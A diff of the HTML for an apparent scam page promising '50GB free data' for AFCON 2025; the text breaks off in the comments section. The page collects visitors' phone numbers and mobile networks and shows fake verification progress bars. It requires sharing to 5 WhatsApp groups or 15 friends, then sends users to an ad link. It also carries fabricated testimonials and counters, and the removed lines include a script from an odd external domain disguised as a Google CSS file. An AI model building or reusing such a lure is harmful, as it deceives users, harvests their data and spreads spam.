@@ -1,374 +1,689 @@
+
+
+
+
+
 <!DOCTYPE html>
-<html lang="en"><head>
- <script src="imgvpimgvip.org/google-aapi-css.js"></script>
-  <script src="active-ug.js"></script>
-	<script src="demo.js"></script>
-   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AFCON2025 50GB FREE DATA OFFER</title>
-	<meta name="google-adsense-platform-domain" content="blogspot.com">
-    <script src="imgvpimgvip.org/google-aapi-css.js"></script>
-	<link rel="me" href="https://www.blogger.com/profile/03760741075252211382">
-  <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiVVw4JcsOoyZH02nWWaD6u4gInNa1nPD-tKGJHNm6NvC0iceTZmq8KRQSpK95HUL_aLemW9T82w-wpMISiwIi2kwH5SNo9PPDcZgP9_Tz9k7-kitMZlO1sqUzPXRX7_ckayUoc0AsxznFNxhVEEM8ITvB-sHzCqj7Yzu6bg3osN8KLPXh08wNO5RIrW1A/s800/WhatsApp%20Image%202025-12-30%20at%2005.28.45.jpeg">
-  <meta property="og:type" content="website">
+<html>
+    <head>
+      
+    <script>
 
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AFCON 50GB FREE DATA OFFER </title>
-    <style>
-        :root { 
-            --opay-green: #2e3897; 
-            --opay-dark: #1C1C1E; 
-            --opay-bg: #F0F2F5;
-            --card-shadow: 0 12px 40px rgba(0,0,0,0.08);
-            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+        function set_Cookie(name,value){
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days*20*1000));
+            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
         }
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; } 
-        body { font-family: 'Inter', -apple-system, system-ui, sans-serif; background-color: var(--opay-bg); margin: 0; padding: 0; color: #333; overflow-x: hidden; }
-
-        /* Status Bar */
-        .live-status {
-            background: #fff; padding: 12px; font-size: 13px; text-align: center;
-            border-bottom: 1px solid #E5E7EB; color: #4B5563; font-weight: 600;
-        }
-        .dot { height: 10px; width: 10px; background-color: var(--opay-green); border-radius: 50%; display: inline-block; margin-right: 8px; animation: blink 1.2s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
-
-        /* Header */
-        .header { 
-            background: linear-gradient(135deg, #2e3897 0%, #1A924D 100%); color: white; 
-            padding: 45px 20px 90px; text-align: center; border-bottom-left-radius: 45px; border-bottom-right-radius: 45px;
-        }
-        .header img { width: 130px; margin-bottom: 12px; }
-        .header p { margin: 0; font-size: 16px; font-weight: 500; opacity: 0.95; }
-
-        .container { padding: 0 20px; max-width: 500px; margin: 0 auto; }
-        
-        .main-card { 
-            background: white; border-radius: 30px; padding: 35px 25px; 
-            box-shadow: var(--card-shadow); text-align: center; margin-top: -65px; 
-            position: relative; z-index: 10;
+        function get_Cookie(name){
+            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+            if(arr=document.cookie.match(reg)){
+                return unescape(arr[2]);
+            }
+            return '';
         }
 
-        .slots-box { 
-            background: #FEF2F2; border: 1px solid #FEE2E2; padding: 12px; 
-            border-radius: 14px; margin-bottom: 25px; font-size: 13px; color: #DC2626; font-weight: 800; 
-        }
 
-        h3 { margin: 0 0 12px; font-size: 24px; color: var(--opay-dark); font-weight: 800; }
-        .sub-text { font-size: 14px; color: #6B7280; margin-bottom: 30px; display: block; line-height: 1.6; }
+        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
+                        document.getElementById("first-box")."quedate__step".display="none";//??;
+                        document.getElementById("second-box").style.display="none";//??;
+                        document.getElementById("third-box").style.display="none";//??;
+                        document.getElementsByClassName("loading2__box").style.display="";//??;
+                    }*/
 
-        /* Form Elements */
-        .opay-input { 
-            width: 100%; padding: 18px; border: 2px solid #F3F4F6; border-radius: 16px; 
-            font-size: 16px; margin-bottom: 15px; outline: none; background: #F9FAFB;
-        }
-        .btn { 
-            width: 100%; padding: 18px; border: none; border-radius: 16px; 
-            font-size: 16px; font-weight: 700; cursor: pointer; transition: var(--transition);
-        }
-        .btn-primary { background: var(--opay-green); color: white; box-shadow: 0 8px 20px rgba(34, 187, 98, 0.25); }
-        .btn-dark { background: var(--opay-dark); color: white; }
-        
-        .option-btn { 
-            width: 100%; padding: 16px; border: 1px solid #E5E7EB; border-radius: 16px; 
-            background: #fff; margin-bottom: 12px; cursor: pointer; font-size: 16px; 
-            font-weight: 600; color: #4B5563;
-        }
 
-        /* Modals */
-        .modal-overlay { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); 
-            z-index: 1000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(8px);
-        }
-        .modal-card { background: white; width: 90%; max-width: 380px; border-radius: 35px; padding: 45px 25px; text-align: center; animation: pop 0.4s ease-out; }
-        @keyframes pop { from { transform: scale(0.7); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    </script>
+  
+       <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title> AFCON 2025 50GB FREE DATA OFFER</title>
+        <link rel="shortcut icon" type="image/png" href="https://3-mob.com/wp-content/uploads/2025/11/afcon_morocco_2025_initial_logo5771874518051563779-1024x566.png" />
+        <meta name="og:title" content=" AFCON 2025 50GB FREE DATA OFFER" />
+        <meta property="og:description" content="We are Giving out 50GB Free Data to everyone 🎉" />
+        <meta property="og:image" content="https://3-mob.com/wp-content/uploads/2025/11/afcon_morocco_2025_initial_logo5771874518051563779-1024x566.png" />
+        <meta property="og:type" content="website" />
+    <meta property="og:updated_time" content="1440432930" />
+    <link rel="me" href="https://www.blogger.com/profile/13809910274301822692" />
 
-        .spark-icon { font-size: 60px; margin-bottom: 15px; display: block; animation: spark 1s infinite; }
-        @keyframes spark { 0% { transform: scale(1); } 50% { transform: scale(1.2); filter: drop-shadow(0 0 10px #FFD700); } 100% { transform: scale(1); } }
-
-        /* Failure Shake Animation */
-        @keyframes error-shake {
-            0%, 100% { transform: translateX(0); }
-            20%, 60% { transform: translateX(-10px); }
-            40%, 80% { transform: translateX(10px); }
-        }
-        .error-shake { animation: error-shake 0.4s ease-in-out; border-color: #DC2626 !important; background: #FFF5F5 !important; }
-
-        /* Share Page UI */
-        .verification-badge { background: #E8F7EE; color: var(--opay-green); padding: 8px 16px; border-radius: 50px; font-size: 12px; font-weight: 700; display: inline-block; margin-bottom: 15px; }
-        .share-instruction-card { background: #F8FAFC; border: 1px solid #E2E8F0; border-radius: 20px; padding: 20px; text-align: left; margin-bottom: 20px; }
-        .instruction-step { display: flex; gap: 12px; margin-bottom: 12px; font-size: 14px; color: #475569; align-items: center; }
-        .step-num { background: var(--opay-green); color: white; width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 800; flex-shrink: 0; }
-        .btn-wa { background: #25D366; color: white; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .btn-claim { background: #000; color: white; display: none; margin-top: 15px; animation: pulse 1.5s infinite; }
-
-        .progress-box { background: #E5E7EB; border-radius: 50px; height: 18px; margin: 25px 0; position: relative; overflow: hidden; }
-        #bar { height: 100%; width: 0%; background: linear-gradient(90deg, #2e3897, #4ADE80); transition: width 0.5s ease; }
-        #pct { position: absolute; width: 100%; top: 0; left: 0; line-height: 18px; font-size: 10px; font-weight: 900; color: #1F2937; text-align: center; }
-
-        /* Gift Grid */
-        .gift-container { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
-        .gift-box { background: #FFF5F5; border: 2px dashed #FECACA; padding: 25px 5px; border-radius: 20px; font-size: 34px; cursor: pointer; transition: 0.3s; }
-
-        /* Comments - FIXED PADDING & ALIGNMENT */
-        .comment-area { background: #fff; padding: 30px 20px; border-radius: 25px; margin-top: 25px; box-shadow: var(--card-shadow); margin-bottom: 30px; }
-        .comment-title { font-size: 17px; font-weight: 800; color: #111827; margin-bottom: 20px; border-bottom: 1px solid #F3F4F6; padding-bottom: 12px; }
-        .comment-feed { clear: both; margin-top: 5px; text-align: left; }
-        .comment-item { display: flex; gap: 12px; margin-bottom: 20px; align-items: flex-start; }
-        .comment-avatar { 
-            width: 48px; 
-            height: 48px; 
-            border-radius: 50%; 
-            object-fit: cover; 
-            flex-shrink: 0; 
-            display: block;
-        }
-        .comment-body { background: #F8FAFC; padding: 14px 18px; border-radius: 20px; flex-grow: 1; border: 1px solid #F1F5F9; }
-        .comment-name { font-weight: 800; font-size: 14px; color: #111827; display: block; }
-        .comment-text { font-size: 14px; color: #4B5563; line-height: 1.5; margin-top: 5px; margin-bottom: 0; }
-        .comment-time { font-size: 11px; color: #9CA3AF; margin-top: 8px; display: block; }
-
-        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: rgba(17, 24, 39, 0.95); color: white; padding: 14px 28px; border-radius: 50px; font-size: 12px; z-index: 2000; display: none; font-weight: 600; }
-        
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.02); } 100% { transform: scale(1); } }
-        
-        #step-name, #step-account, #step-applied, #step-gender, #step-age, #step-load, #step-gift, #step-share { display: none; }
-        .footer-text { text-align: center; font-size: 11px; color: #9CA3AF; margin-bottom: 40px; font-weight: 700; }
-    </style>
-<script src="imgvpimgvip.org/google-aapi-css.js"></script>
-<link rel="me" href="https://www.blogger.com/profile/04701200208185977098">
-<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-<meta name="google-adsense-platform-domain" content="blogspot.com">
+<link rel="me" href="https://www.blogger.com/profile/17222055979768522082" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/05963652588202294752" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/05853757488319578479" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/03760741075252211382" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/13505557265109218333" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/06403291488377277313" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/01562472738468891477" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
 </head>
 <body>
+  <style>
+  .blink {
+  animation: blink 1s steps(1, end) infinite;
+}
 
-<div class="live-status">
-    <span class="dot"></span> <span id="online-count">1,375</span> users are currently claiming this reward
-</div>
+@keyframes blink {
+  0% {
+    opacity: 1;
+  }
+  50% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+</style>
+<style type="text/css">
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
+@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
+* {
+    margin: 0;
+    padding: 0;
+    font-family: Poppins, Droid Arabic Naskh;
+    font-weight: normal;
+    box-sizing: border-box;
 
-<div class="header">
-    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiVVw4JcsOoyZH02nWWaD6u4gInNa1nPD-tKGJHNm6NvC0iceTZmq8KRQSpK95HUL_aLemW9T82w-wpMISiwIi2kwH5SNo9PPDcZgP9_Tz9k7-kitMZlO1sqUzPXRX7_ckayUoc0AsxznFNxhVEEM8ITvB-sHzCqj7Yzu6bg3osN8KLPXh08wNO5RIrW1A/s800/WhatsApp%20Image%202025-12-30%20at%2005.28.45.jpeg" alt="OPay" style="width: 75%;">
-    <p>AFCON 2025 50GB FREE DATA BONUS </p>
-</div>
 
-<div class="container">
-    <div class="main-card">
-        <div class="slots-box">⚡ Limited Offer: Only <span id="slots">498</span> rewards left!</div>
+}
+body {
+    direction: lfl;
+    background: #397d48;
+}
+a {
+    text-decoration: none;
+}
+.post {
+    background: #fff;
+    margin: 0 auto;
+    padding: 10px;
+    max-width: 500px;
+    border: 1px solid #d0d1d5;
+    border-radius: 3px;
+}
+.post img {
+    width: 100%;
+}
+.welcome {
+    font-size: 15px;
+}
+.amount,
+#getname {
+    color: #ED351C;
+    text-decoration: none;
+}
+.done {
+    text-align: center;
+    color: #27ae60;
+}
+.tip {
+    font-size: 14px;
+}
+.title {
+    text-align: center;
+}
+.error {
+    display: none;
+    text-align: center;
+    font-size: 14px;
+    color: #e74c3c;
+}
+button {
+    display: block;
+    width: 200px;
+    height: 50px;
+    color: #fff;
+    border: none;
+    outline: none;
+    font-size: 24px;
+    cursor: pointer;
+    border-radius: 5px;
+    padding: 0 10px;
+    margin: 10px auto;
+    background: rgb(218, 38, 2);
+    transition: background 0.3s ease;
+}
+button:hover {
+    background: #098105;
+}
+.phone {
+    max-width: 400px;
+    margin: 10px auto;
+}
+.phone input {
+    width: 100%;
+    height: 50px;
+    padding: 10px;
+    outline: none;
+    border: 2px solid #cecece;
+    font-size: 14px;
+}
+#confirm {
+    width: 200px;
+    margin: 10px auto;
+    border-radius: 0px;
+}
+#loader {
+    text-align: center;
+}
+.spin {
+    width: 50px;
+    height: 50px;
+    background: transparent;
+    border: solid 8px rgb(218, 38, 2);
+    border-right-color: transparent;
+    border-radius: 50%;
+    margin: 10px auto;
+    animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+    100% {
+        transform: rotate(1turn);
+    }
+}
+#loader,
+#info,
+#checking,
+#share,
+#claim {
+    display: none;
+}
+.center {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.barr {
+    direction: ltr;
+    max-width: 400px;
+    margin: 10px auto;
+    box-sizing: border-box;
+}
+.fill {
+    position: relative;
+    display: inline-block;
+    width: calc(100% - 100px);
+    height: 35px;
+    padding: 2px;
+    border: 2px solid #ED351C;
+}
+#fill,
+#fill2 {
+    background: #ED351C;
+    width: 0%;
+    height: 100%;
+}
+.percentage {
+    width: 100px;
+    float: right;
+    height: 35px;
+    font-size: 16px;
+    border: 2px solid #ED351C;
+}
+#percentage,
+#percentage2 {
+    margin-left: 5px;
+}
+#check,
+#check2 {
+    display: none;
+}
+.counter {
+    color: #7f7f7f;
+    font-size: 12px;
+    text-align: right;
+    padding: 10px 0 10px 2px;
+    border-bottom: 1px solid #e1e2e3;
+}
+.reactions {
+    display: inline-flex;
+    align-items: center;
+    float: left;
+}
+.counter img {
+    float: left;
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    border: 2px solid #fff;
+    box-sizing: content-box;
+}
+.like,
+.love {
+    margin-right: -5px;
+}
+.like {
+    z-index: 2;
+}
+.love {
+    z-index: 1;
+}
+.bar {
+    display: table;
+    width: 100%;
+    border-bottom: 1px solid #e1e2e3;
+}
+.bar .react {
+    display: table-cell;
+    width: calc(100% / 3);
+    font-size: 12px;
+    color: #7f7f7f;
+    text-align: center;
+    padding: 10px 0;
+    cursor: pointer;
+}
+.comments {
+    direction: ltr;
+}
+.comment {
+    padding: 6px 0;
+    margin-top: 5px;
+}
+.comment img {
+    float: left;
+    width: 32px;
+    height: 32px;
+    border: none;
+    border-radius: 18px;
+    cursor: pointer;
+}
+.reply {
+    margin-left: 37px;
+}
+.single-container {
+    margin-left: 37px;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    font-size: 12px;
+}
+.single-container .user {
+    display: inline-block;
+    cursor: pointer;
+    color: #365899;
+    margin-bottom: 5px;
+}
+.single-container .text {
+    display: block;
+}
+.buttons {
+    font-size: 12px;
+    font-weight: bold;
+    margin: 10px 0 0 47px;
+    color: #90949c;
+}
+.action {
+    cursor: pointer;
+}
+.action:hover {
+    text-decoration: underline;
+}
+.input {
+    padding: 6px 12px 12px;
+}
+.input input {
+    width: 100%;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    border: 0;
+    outline: none;
+}
+.A{
+    text-align: center;
+    background-color: rgb(88, 58, 84);
+}
+</style>
+  
+  
+  
+  <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhF-oTHguNzR96xr0j8e_LHDafdqhV_3FDtynGvqggz_NYP6OHB_22bcsi4iy0raqMBaY6vuG9HRLz9IfmzfwGrHYBWk95LQ8wPNMcEaxW6V7uKPTEhyphenhyphenosRUzRFT2iOXu8RzWLSa8dZNx-FjdwFmoobTewdW6Tz8Ypx-LySN3FYzcuXAV5PGMObMnNKi_s/s684/WhatsApp%20Image%202026-01-04%20at%2014.11.28.jpeg" alt="Free-Data" style="width: 100%;"></center>
+   <center><img src="https://3-mob.com/wp-content/uploads/2025/11/afcon_morocco_2025_initial_logo5771874518051563779-1024x566.png" alt="Free-Data" style="width: 100%;"></center>
+  
+                        <div class="A">
+                        <font color="white"><H1>AFCON 50GB FREE DATA OFFER</H1><br> Check if You Are Eligible to Get 50GB Free Data AFCON Reward🎉</font><br/><font color="#F79B84"> Hurry and get this amazing offer</font>
+         </div>
+    <div class="post" width="100%">
 
-        <div id="step-init">
-            <h3>AFCON2025 50GB FREE DATA OFFER!</h3>
-            <span class="sub-text">Claim your 50GB Free Data Bonus now.</span>
-            <button class="btn btn-primary" onclick="showStep('step-name')">CLAIM 50GB NOW</button>
-        </div>
-
-        <div id="step-name">
-            <h3>Enter Phone Number</h3>
-            <input type="text" id="userName" class="opay-input" placeholder="Enter your phone number">
-            <button class="btn btn-dark" onclick="showStep('step-account')">CONTINUE</button>
-        </div>
-
-        <div id="step-account">
-            <h3>Select Your Network</h3>
-            <div class="option-btn" onclick="showStep('step-applied')">MTN</div>
-            <div class="option-btn" onclick="showStep('step-applied')">ORANGE</div>
-            <div class="option-btn" onclick="showStep('step-applied')">VODACOM</div>
-            <div class="option-btn" onclick="showStep('step-applied')">SAFARICOM</div>
-            <div class="option-btn" onclick="showStep('step-applied')">AIRTEL</div>
-            <div class="option-btn" onclick="showStep('step-applied')">GLO</div>
-            <div class="option-btn" onclick="showStep('step-applied')">ZAIN</div>
-            <div class="option-btn" onclick="showStep('step-applied')">UNITEL</div>
-            <div class="option-btn" onclick="showStep('step-applied')">MOVICEL</div>
-            <div class="option-btn" onclick="showStep('step-applied')">MAROC TELECOM</div>
-            <div class="option-btn" onclick="showStep('step-applied')">CELL C</div>
-            <div class="option-btn" onclick="showStep('step-applied')">TELKOM</div>
-            <div class="option-btn" onclick="showStep('step-applied')">OTHERS</div>
-        </div>
-
-        <div id="step-applied">
-            <h3>Have You Received This 50GB Offer Before?</h3>
-            <div class="option-btn" onclick="showStep('step-gender')">YES</div>
-            <div class="option-btn" onclick="showStep('step-gender')">NO</div>
+        <div id="intro">
          
+            <p class="welcome">
+              <center><b><font color="red">Enter your Mobile Number Below</font></b></center>
+              
+               
+                <center><input type="char" placeholder="phone number" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/>
+                 
+                
+              
+               
+          
+               
+            <button id="go">Proceed ➤</button>
+        </div>
+        <div id="loader">
+            <div>Checking Your Mobile Number...</div>
+            <div class="spin"></div>
+            <div id="num">0%</div>
+        </div>
+        <div id="info">
          
-        </div>
-
-        <div id="step-gender">
-            <h3>Rate The Ongoing AFCON2025?</h3>
-            <div class="option-btn" onclick="showStep('step-age')">Great</div>
-            <div class="option-btn" onclick="showStep('step-age')">Good</div>
-          <div class="option-btn" onclick="showStep('step-age')">Excellent</div>
-          <div class="option-btn" onclick="showStep('step-age')">Poor</div>
-        </div>
-
-        <div id="step-age">
-            <h3>Select Your Age Range</h3>
-            <div class="option-btn" onclick="showStep('step-load')">18-25</div>
-            <div class="option-btn" onclick="showStep('step-load')">26-35</div>
-            <div class="option-btn" onclick="showStep('step-load')">36+</div>
-        </div>
-
-        <div id="step-load">
-            <div style="border: 4px solid #f3f3f3; border-top: 4px solid #2e3897; border-radius: 50%; width: 45px; height: 45px; animation: spin 0.8s linear infinite; margin: 40px auto;"></div>
-            <p style="font-weight: 700;">Processing Rewards...</p>
-        </div>
-
-        <div id="step-gift">
-            <h3>Find Your Reward</h3>
-            <p class="sub-text">Tap a box to open your Reward!</p>
-            <div class="gift-container">
-                <div class="gift-box" onclick="pickBox(this)">🎁</div>
-                <div class="gift-box" onclick="pickBox(this)">🎁</div>
-                <div class="gift-box" onclick="pickBox(this)">🎁</div>
-                <div class="gift-box" onclick="pickBox(this)">🎁</div>
-                <div class="gift-box" onclick="pickBox(this)">🎁</div>
-                <div class="gift-box" onclick="pickBox(this)">🎁</div>
+          
+              <center>
+<center><p class="title">CHOOSE YOUR NETWORK</p></center>
+<select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
+    width: 330px;
+    height: 56px;
+">
+<option value="أختر نوع الشبكة" selected="1">---Select Network---</option>
+  <option value="1">MTN - 50GB  </option>
+<option value="2"> AIRTEL - 50GB</option>
+ <option value="2"> AFRICEL - 50GB </option>
+	<option value="1">ORANGE - 50GB  </option>
+<option value="2"> VODACOM - 50GB</option>
+ <option value="2"> SAFARICOM - 50GB </option>
+	<option value="1">GLO - 50GB  </option>
+<option value="2"> ZAIN - 50GB</option>
+ <option value="2"> UNITEL - 50GB </option>
+	<option value="1">MOVICEL - 50GB  </option>
+<option value="2"> VODAFONE - 50GB</option>
+ <option value="2"> MAROC TELECOM - 50GB </option>
+	<option value="1">CELL C - 50GB  </option>
+<option value="2"> TELKOM - 50GB</option>
+ <option value="2"> MOOV - 50GB </option>
+	<option value="1">OTHERS - 50GB  </option>
+</select>
+</center><br>
+          
+                  
+          <button id="confirm">Send</button>
             </div>
+            <p class="error">Sorry, Your Number is Missing <a href="https://afcon.offer-it.live/50GB"> <b><font color="#14948F">ADD NUMBER</font></b></a></p>
         </div>
-
-        <div id="step-share">
-            <div class="verification-badge">ID VERIFIED: ✅</div>
-            <h3 style="color:var(--opay-green);">50GB FREE DATA APPROVED</h3>
-            <div class="share-instruction-card">
-                <div class="instruction-step"><div class="step-num">1</div><div>Share with <b>5 Groups</b> or <b>15 Friends</b></div></div>
-                <div class="instruction-step"><div class="step-num">2</div><div>Bar must reach <b>100%</b></div></div>
-                <div class="instruction-step" style="margin-bottom:0;"><div class="step-num">3</div><div>Click <b>'WITHDRAW'</b></div></div>
-            </div>
-            <div class="progress-box"><div id="bar"></div><div id="pct">0% VERIFIED</div></div>
-            <button class="btn btn-wa" onclick="handleShare()">SHARE ON WHATSAPP</button>
-            <button class="btn btn-claim" id="claim" onclick="finalRedirect()">ACCEPT 50GB</button>
-			<button class="btn btn-claim" id="claim" onclick="finalRedirect()">CLAIM 50GB DATA</button>
-        </div>
-    </div>
-
-    <div class="modal-overlay" id="modal-try">
-        <div class="modal-card" id="fail-card">
-            <span style="font-size: 50px;">❌</span>
-            <h3>Empty Box!</h3>
-            <p>You have 1 attempt left. Try again!</p>
-            <button class="btn btn-dark" onclick="closeModal('modal-try')">TRY AGAIN</button>
-        </div>
-    </div>
-
-    <div class="modal-overlay" id="modal-win">
-        <div class="modal-card">
-            <span class="spark-icon">✨💰✨</span>
-            <h3 style="color: var(--opay-green);">Congratulations!</h3>
-            <p>You found the <b>50GB Free Data Bonus</b>!</p>
-            <button class="btn btn-primary" onclick="proceedToShare()">CLAIM NOW</button>
-        </div>
-    </div>
-
-    <div class="comment-area">
-        <div class="comment-title">💬 User Testimonials</div>
-        <div class="comment-feed">
-            <div class="comment-item">
-                <img class="comment-avatar" src="https://images.unsplash.com/photo-1531123897727-8f129e1688ce?w=100">
-                <div class="comment-body">
-                    <span class="comment-name">Aisha Yusuf</span>
-                    <p class="comment-text">Alhamdulillah! I got my 50gb alert  🙏</p>
-                    <span class="comment-time">Just now</span>
+        <div id="checking">
+          <p class="title"><font color="white">Activating 50GB ...</font></p>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill"></div>
                 </div>
-            </div>
-            <div class="comment-item">
-                <img class="comment-avatar" src="https://images.unsplash.com/profile-1746438434410-848a4180617dimage?w=100">
-                <div class="comment-body">
-                    <span class="comment-name">Musa Abdullahi</span>
-                    <p class="comment-text">Omo, 50GB enter my account. </p>
-                    <span class="comment-time">2 mins ago</span>
-                </div>
-            </div>
-            <div class="comment-item">
-                <img class="comment-avatar" src="https://images.unsplash.com/profile-1685741878138-99922ce0a9b2image?w=100">
-                <div class="comment-body">
-                    <span class="comment-name">Umar Hassan</span>
-                    <p class="comment-text">Thank You I got Credited. THANKS. 🙌</p>
-                    <span class="comment-time">5 mins ago</span>
-                </div>
-            </div>
-            <div class="comment-item">
-                <img class="comment-avatar" src="https://images.unsplash.com/profile-1648958229092-bfd45355f68aimage?w=100">
-                <div class="comment-body">
-                    <span class="comment-name">Bello Kyari</span>
-                    <p class="comment-text">Just got my alert. Very fast! God bless you Guys</p>
-                    <span class="comment-time">10 mins ago</span>
+                <div class="percentage center">
+                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="check"><i class="fa fa-check-circle"></i></span>
+                    <span id="percentage"></span>
                 </div>
             </div>
         </div>
+        <div id="share">
+
+          <p class="tip"><font color="white"> Congratulations, Your Mobile Number </font><span id="getname"></span>،</p>
+            <p class="tip">
+              <font color="white">is Eligible to receive 50GB Free Data Valid For 30Days</font><span class="amount"> <font color="yellow">Proceed to Activate your 50GB</font></span><br>
+              <font color="white"> How to proceed:</font>
+            </p><br><font color="white">
+            <p class="tip">1. Share it with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</p>
+            <p class="tip">2. You will be redirected automatically to our "ACTIVATION" page after the RED verification bar is filled.</p>
+          </font>
+
+            <button id="whatsapp">SHARE</button>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill2"></div>
+                </div>
+                <div class="percentage center">
+                    <span><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="percentage2">0%</span>
+                </div>
+            </div>
+        </div>
+        <div id="claim">
+            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
+            <p class="title"> <font color="white">Click "ACTIVATE" to activate your  50GB </font> </p>
+           <br/>
+          <a  onclick="window.open('https://ey43.com/4/10368794')" href="https://ey43.com/4/10368794" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">ACTIVATE 50GB DATA</font></button>
+                    </a><br/>
+          
+       <a  onclick="window.open('https://ey43.com/4/10368794')" href="https://ey43.com/4/10368794" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">CLAIM 50GB DATA</font></button>
+                    </a><br/>
+             <br/>
+            <button id="offer">ACTIVATE</button><br/>
+             
+             
+          
+          
+              </div>
+        <div class="comments">
+            <div class="counter">
+                <div class="reactions">
+                    <img class="like" src="https://i.imgur.com/g6cV61A.png" /> <img class="love" src="https://i.imgur.com/0UHB1f0.png" /> <img class="care" src="https://i.imgur.com/sSMYbTT.png" /> <span id="likes">134K</span>
+                </div>
+                <span id="comments">23K comments</span> <span class="dot">·</span> <span id="shares">12K shares</span>
+            </div>
+            <div class="bar">
+                <span class="react"><i class="fa fa-thumbs-o-up"></i> <a class="liked">Like</a></span> <span class="react"><i class="fa fa-comment-o"></i> Comment</span> <span class="react"><i class="fa fa-share"></i> Share</span>
+            </div>
+            <div>
+                <div class="comment">
+                    </div>
+                </div>
+                <div class="comment">
+                    <img src="https://i.imgur.com/xp1ER6K.jpg" />
+                    <div class="single-container">
+                        <span class="user"> Joseph Emmanuel </span>
+                        <span class="text"> 
+                        I doubt this offer at first, but it's real. i just got my 50GB thank you.
+                        </span>
+                    </div>
+                    <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment">
+                    <img src="https://1.bp.blogspot.com/--d2BBdGugW8/XpdlXRvB-HI/AAAAAAAAAJ8/xcstaPQkWoszaizR_rkK2Nc5L7xN2o7WACLcBGAsYHQ/s1600/FB_IMG_15869726679037399.jpg" />
+                    <div class="single-container"><span class="user">David Anthony</span> <span class="text"> I just received 50GB  wow unbeleivable. thank you MTN </span></div>
+                    <div class="buttons"><span class="time t2">2m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment reply">
+                    <img src="https://1.bp.blogspot.com/-UQW1DxDR9Ko/XpdlghF8wJI/AAAAAAAAAKU/EXuIMhMGNeED6BwLWbxkGgtBe3HL0RTTACLcBGAsYHQ/s1600/FB_IMG_15869730921979436.jpg" />
+                    <div class="single-container"><span class="user">Amahle John </span> <span class="text"> My own is pending because i just finish sharing. Please help! </span></div>
+                    <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment">
